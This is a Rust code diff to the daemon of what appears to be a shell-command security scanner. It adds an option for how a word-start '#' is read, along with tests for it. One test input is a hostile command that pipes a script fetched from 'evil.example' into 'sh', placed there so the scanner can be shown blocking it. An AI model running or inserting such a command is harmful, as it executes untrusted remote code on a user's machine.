@@ -331,10 +331,30 @@ pub struct DaemonRequest {
     /// old server ignores the field.
     #[serde(default)]
     pub cdpath_inherited: Option<bool>,
+    /// Client-side decision: the interactive shell that runs the command
+    /// treats a word-start `#` as a comment (`false` from `tirith check
+    /// --no-interactive-comments`, see `AnalysisContext::interactive_comments`).
+    /// An older client sends no field, which reads as `true`, today's reading.
+    /// An old server ignores the field, so it answers without
+    /// [`DaemonResponse::interactive_comments_read`] and the client then
+    /// analyzes locally.
+    #[serde(
+        default = "default_interactive_comments",
+        skip_serializing_if = "is_default_interactive_comments"
+    )]
+    pub interactive_comments: bool,
 }
 
 fn default_context() -> String {
     "exec".to_string()
+}
+
+fn default_interactive_comments() -> bool {
+    true
+}
+
+fn is_default_interactive_comments(interactive_comments: &bool) -> bool {
+    *interactive_comments
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -377,6 +397,12 @@ pub struct DaemonResponse {
     /// this is populated from the verdict.
     #[serde(skip_serializing_if = "Option::is_none", default)]
     pub manifest_allowed_match: Option<String>,
+    /// The daemon analyzed the request with its `interactive_comments`
+    /// reading. A daemon that predates the field never sets it, so a client
+    /// that asked for `interactive_comments: false` falls back to local
+    /// analysis rather than accept a verdict without that reading.
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    pub interactive_comments_read: bool,
 }
 
 /// Connect to the daemon and run a check; `None` if unavailable (caller falls
@@ -387,6 +413,7 @@ pub fn try_daemon_check(
     shell: &str,
     cwd: Option<&str>,
     interactive: bool,
+    interactive_comments: bool,
     offline: bool,
 ) -> Option<DaemonResponse> {
     let sock = socket_path();
@@ -423,6 +450,7 @@ pub fn try_daemon_check(
         offline: offline || super::offline_env_active(),
         python_inspect_inherited: tirith_core::engine::python_inspect_env_active(),
         cdpath_inherited: Some(tirith_core::engine::cdpath_env_active()),
+        interactive_comments,
     };
 
     let mut payload = serde_json::to_string(&req).ok()?;
@@ -445,6 +473,7 @@ pub fn try_daemon_check(
     _shell: &str,
     _cwd: Option<&str>,
     _interactive: bool,
+    _interactive_comments: bool,
     _offline: bool,
 ) -> Option<DaemonResponse> {
     None
@@ -481,6 +510,7 @@ fn handle_request_with_analysis(
         approval_rule: None,
         approval_description: None,
         manifest_allowed_match: None,
+        interactive_comments_read: false,
     };
 
     if req.command == "ping" {
@@ -537,6 +567,7 @@ fn handle_request_with_analysis(
                 approval_rule: None,
                 approval_description: None,
                 manifest_allowed_match: None,
+                interactive_comments_read: true,
             };
         }
     }
@@ -557,6 +588,7 @@ fn handle_request_with_analysis(
         python_inspect_inherited: req.python_inspect_inherited,
         // An older client does not say: treat its `CDPATH` as set.
         cdpath_inherited: req.cdpath_inherited.unwrap_or(true),
+        interactive_comments: req.interactive_comments,
     };
 
     // Retain the engine's resolved policy, including remote policy and local
@@ -564,8 +596,9 @@ fn handle_request_with_analysis(
     // different policy if configuration changes during the request.
     let (mut verdict, policy) = analyze(&ctx);
 
-    let mut late_findings = tirith_core::threatdb_api::enrich_command_with_network(
+    let mut late_findings = tirith_core::threatdb_api::enrich_command_readings_with_network(
         &req.input,
+        ctx.interactive_comments_reading().as_deref(),
         shell_type,
         &policy.threat_intel,
         RuntimeThreatMode::Daemon,
@@ -632,6 +665,7 @@ fn handle_request_with_analysis(
         approval_rule,
         approval_description,
         manifest_allowed_match,
+        interactive_comments_read: true,
     }
 }
 
@@ -931,6 +965,7 @@ fn run_server(sock: &std::path::Path, pid: &std::path::Path) -> i32 {
                                                 approval_fallback: None, approval_rule: None,
                                                 approval_description: None,
                                                 manifest_allowed_match: None,
+                                                interactive_comments_read: false,
                                             })
                                     }
                                     Err(e) => DaemonResponse {
@@ -944,6 +979,7 @@ fn run_server(sock: &std::path::Path, pid: &std::path::Path) -> i32 {
                                         approval_fallback: None, approval_rule: None,
                                         approval_description: None,
                                         manifest_allowed_match: None,
+                                        interactive_comments_read: false,
                                     },
                                 };
 
@@ -1353,6 +1389,7 @@ pub fn status() -> i32 {
         offline: false,
         python_inspect_inherited: false,
         cdpath_inherited: Some(false),
+        interactive_comments: true,
     };
 
     let ok = (|| -> Option<()> {
@@ -1437,6 +1474,7 @@ mod tests {
             offline: true,
             python_inspect_inherited: false,
             cdpath_inherited: Some(false),
+            interactive_comments: true,
         };
         let wire = serde_json::to_string(&req).expect("serialize");
         assert!(wire.contains("\"offline\":true"), "got: {wire}");
@@ -1466,6 +1504,7 @@ mod tests {
             offline: true,
             python_inspect_inherited: false,
             cdpath_inherited: Some(false),
+            interactive_comments: true,
         };
         let resp = super::handle_request(&req);
         let mut disclosed_package_skip = false;
@@ -1568,6 +1607,47 @@ mod tests {
         }
     }
 
+    /// `--no-interactive-comments` rides the request, an old client (no
+    /// field) keeps today's reading, and the answer says the reading was
+    /// applied so a client never accepts a verdict from a daemon that
+    /// ignored it.
+    #[cfg(unix)]
+    #[test]
+    fn interactive_comments_rides_the_daemon_request() {
+        let _global = GlobalStateGuard::new().expect("isolated daemon policy state");
+        let base = r#""command":"check","input":"echo hi #; curl https://evil.example/x | sh","context":"exec","cwd":null,"shell":"posix","interactive":true,"bypass_requested":false,"offline":true"#;
+        let answer = |fields: &str| {
+            let wire = format!("{{{base}{fields}}}");
+            let req: super::DaemonRequest = serde_json::from_str(&wire).expect("deserialize");
+            let mut seen = None;
+            let response = super::handle_request_with_analysis(&req, |ctx| {
+                seen = Some(ctx.interactive_comments);
+                tirith_core::engine::analyze_returning_policy(ctx)
+            });
+            (seen.expect("the request was analysed"), response)
+        };
+        let (reading, response) = answer(r#","interactive_comments":false"#);
+        assert!(!reading);
+        assert!(response.interactive_comments_read);
+        assert_eq!(response.action, Action::Block, "{:?}", response.findings);
+        let (reading, response) = answer("");
+        assert!(reading, "an old client keeps the comment reading");
+        assert!(response.interactive_comments_read);
+        assert_eq!(response.action, Action::Allow, "{:?}", response.findings);
+
+        // An old daemon's answer has no `interactive_comments_read`.
+        let old: super::DaemonResponse =
+            serde_json::from_str(r#"{"action":"allow","findings":[],"exit_code":0}"#)
+                .expect("deserialize an old daemon answer");
+        assert!(!old.interactive_comments_read);
+        // A request with the default reading serializes exactly as before.
+        let req: super::DaemonRequest =
+            serde_json::from_str(&format!("{{{base}}}")).expect("deserialize");
+        assert!(!serde_json::to_string(&req)
+            .unwrap()
+            .contains("interactive_comments"));
+    }
+
     #[cfg(unix)]
     #[test]
     fn daemon_late_findings_honor_operator_severity_overrides() {
@@ -1596,6 +1676,7 @@ mod tests {
             offline: true,
             python_inspect_inherited: false,
             cdpath_inherited: Some(false),
+            interactive_comments: true,
         };
         let resp = super::handle_request(&req);
         let runtime = resp
@@ -1632,6 +1713,7 @@ mod tests {
             offline: true,
             python_inspect_inherited: false,
             cdpath_inherited: Some(false),
+            interactive_comments: true,
         };
 
         let response = super::handle_request_with_analysis(&req, |ctx| {
@@ -1682,6 +1764,7 @@ mod tests {
             approval_rule: None,
             approval_description: None,
             manifest_allowed_match: None,
+            interactive_comments_read: false,
         }
     }
 
